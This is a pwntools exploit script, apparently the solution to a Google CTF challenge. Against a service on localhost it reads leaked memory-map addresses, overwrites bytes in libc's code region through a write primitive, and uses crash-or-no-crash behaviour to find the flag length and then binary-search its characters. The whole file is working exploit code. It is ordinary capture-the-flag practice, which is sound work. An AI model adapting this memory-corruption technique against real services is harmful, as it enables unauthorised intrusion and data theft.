#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
# For a different libc chance exit_base, first_ret and far_ret
port = 1337
def remote_write(r,address,length):
	#print("Writing",hex(address) + " " + str(length))
	payload = hex(address) + " " + str(length)
	payload += ' ' * (64 - len(payload))
	assert len(payload) == 64
	r.send(payload)

r = remote('localhost',port)
sleep(1)
output = r.recv()
end_data = output[output.rfind(b"["):]
print("Received",output)
binary_base = int(output.split(b"\n")[5].split(b'-')[0],16)
libc_base = int(output.split(b"\n")[12].split(b'-')[0],16)

def libc_write(r,offset,length):
	remote_write(r,libc_base + offset,length)

print("Binary base",hex(binary_base))
print("libc base",hex(libc_base))

exit_base = 0x455f0
#exit_base = 0x000000000003e590
first_ret = 0x45680
#first_ret = 0x3e5f2

# Figure out flag length
flag_char_map = {}
flag_char_map['C'] = 0
flag_char_map['T'] = 1
flag_char_map['F'] = 2
flag_char_map['{'] = 3

def write_character(r,c,address):
	if isinstance(c,int):
		remote_write(r,address -c,c + 1)
	else:
		remote_write(r,address - flag_char_map[c],flag_char_map[c] + 1)
def try_flag_length(r,length):
	print("Trying length",length)
	flag_char_map['}'] = length - 1
	flag_char_map['\0'] = length
	for i in range(first_ret - 1 , exit_base - 1, -2):
		write_character(r,'\0',libc_base + i)
	try:
		r.send("finish")
		return r.recv()
	except EOFError:
		return "fail"
for i in range(45,0,-1):
	output = try_flag_length(r,i)
	r.close()
	r = remote('localhost',port)
	new_map = r.recvuntil(end_data)
	libc_base = int(new_map.split(b"\n")[12].split(b'-')[0],16)
	print(output)
	if output != "fail":
		break
else:
	print("Could not get length")
	exit(1)
print("Length is",flag_char_map['\0'])

def fill_nops(r,address_start,address_end):
	for i in range(address_end - 1,address_start - 1,-2):
		write_character(r,'\0',i)
def write_bytes(r,address,array):
	#print("writing",array)
	for i in range(len(array) - 1,-1,-1):
		write_character(r,array[i],address + i)

def write_jump_snippet(r,address,c,jumpsize_test):
	array = ['}',c] # jnp <c-byte>
	array += ['T'] * jumpsize_test
	write_bytes(r,address,array)

#Returns true if we didn't crash
def crash_test():
	try:
		r.send(b"finish")
		r.recv()
		r.close()
		return True
	except EOFError:
		return False

#print("filling nops")
#print("writing jump snippet")
far_ret = 0x4586b
for i in range(0,flag_char_map['\0']):
	min = 66
	max = 78
	while min != max:
		if max - min > 1:
			middle = min + ((max - min) >> 1)
		else:
			middle = max
		#print(min,middle,max)

		fill_nops(r,libc_base + exit_base,libc_base + far_ret)
		write_jump_snippet(r,libc_base + exit_base,i,middle)
		#input("Wait")
		if crash_test():
			min = middle
		else:
			max = middle - 1
		r = remote('localhost',port)
		new_map = r.recvuntil(end_data)
		libc_base = int(new_map.split(b"\n")[12].split(b'-')[0],16)
	exit(chr(min) != 'C')
	
